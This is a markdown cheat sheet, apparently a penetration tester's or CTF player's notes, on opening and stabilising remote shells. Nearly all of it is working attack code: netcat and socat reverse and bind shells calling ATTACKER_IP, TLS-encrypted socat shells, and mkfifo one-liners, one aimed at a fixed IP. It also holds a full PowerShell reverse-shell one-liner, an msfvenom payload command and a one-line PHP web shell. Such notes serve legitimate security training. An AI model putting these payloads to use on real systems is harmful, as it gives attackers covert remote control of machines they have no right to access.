## Netcat
The default tools for connecting reverse and bind shells
```bash
nc -lvnp 9001   # open reverse shell in attack machine
nc ATTACKER_IP 9001 -e /bin/bash   # nc reverse shell from target

nc -lvnp 9001 -e /bin/bash   #open bind shell in target
nc TARGET_IP 9001   # connect to bind shell from attacker machine

# Stabilize shell with:
python -c `import pty; pty.spawn("/bin/bash")` # open pty in target
export TERM=xterm   # give access to term command
#background shell to attacking machine with CTRL-Z
stty raw -echo; fg # + enter twice from attacker machine

# change terminal tty size:
stty -a # look at the current tty settings in our machine
stty rows <number> # adjust rows
stty cols <number  # and columns to be the same as our machine
```

You can also use rlwrap to give a somewhat stable shell, particularly useful for windows. 
`rlwrap nc -lvnp 9001`

## Socat
A more robust tools for shell. You can get it from:
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true

```bash
socat TCP-L:9001 -   # this is the same as nc -lvnp 9001

# revese shell command for windows:
socat TCP:ATTACKER_IP:9001 EXEC:powershell.exe,pipes
# for linux:
socat TCP:ATTACKER_IP:9001 EXEC:"bash -li"

#bind shell for linux:
socat TCP-L:<PORT> EXEC:"bash -li"
#for windows:
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
# connect from attacker with:
socat TCP:<TARGET-IP>:<TARGET-PORT> -

# For a more stable reverse shell for linux:
socat TCP-L:<port> FILE:`/dev/tty`,raw,echo=0  # in attacking machine
# from the target, must use socat to connect with:
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

# Steps to creating encrypted shells connection in socat

#Create certificate
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.cr
#merge the two output into .pem file
cat shell.key shell.crt > shell.pem
#open listener in attacker:
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
# connect from target with:
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

#or with bind shell from target
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
# and connect from attacker:
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

## Common Payloads
Because -e from netcat sometimes not available, use this payload instead:
```bash
# opening bind shell in target
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
# and for reverse shell:
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.50.18 4182 >/tmp/f

#one liner widows powershell reverse connection:
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
And of course the PayloadAllTheThings page:  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## msfvenom
create payload
the _ named file is the stageless payload, whereas one separated with / is staged. example: `windows/x64/meterpreter_reverse_tcp` is stageless, whereas  `windows/x64/meterpreter/reverse_tcp`  is staged.
The staged or meterpreter shell must be catched from metasploit multi/handler module.
```bash
msfvenom --list payloads # list all payloads

#example
msfvenom -p windows/x64/shell/reverse_tcp -f elf -o shell LHOST=10.4.50.18 LPORT=4182
```

## webshell
php: `<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
